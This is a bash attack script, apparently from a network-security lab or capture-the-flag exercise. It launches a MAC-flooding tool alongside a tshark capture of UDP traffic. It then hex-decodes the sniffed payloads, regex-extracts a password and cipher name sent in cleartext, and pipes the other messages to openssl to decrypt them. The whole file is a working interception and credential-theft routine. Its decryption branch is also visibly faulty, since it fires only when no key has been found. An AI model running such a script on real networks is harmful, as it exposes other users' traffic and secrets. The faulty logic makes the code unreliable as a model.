#!/bin/bash

sudo timeout 10 python3 mac_flooding.py & 
sudo timeout 10 tshark -Y "udp" -T fields -e data > raw-data.txt &

wait

my_data=$(cat raw-data.txt)

re="Hi, the password is: (.*) and the cypher algorithm is (.*)"
key=""
algorithm=""

while IFS='\n' read -ra line; do
    for i in "${line[@]}"; do
        base64_line=$(echo $i | xxd -r -p)
        #echo "LINE: $base64_line"
        if [[ $base64_line =~ $re ]]; then 
            key=${BASH_REMATCH[1]}
            algorithm=${BASH_REMATCH[2]}
            echo "RETRIVED PASSWORD AND ALGORITHM..."
        elif [[ -z "$key" ]] && [[ -z "$algorithm" ]]; then
            echo "OK"
            echo $base64_line | openssl enc -d -a $algorithm -k $key -base64
        fi
#        echo $base64_line
    done
done <<< "$my_data"


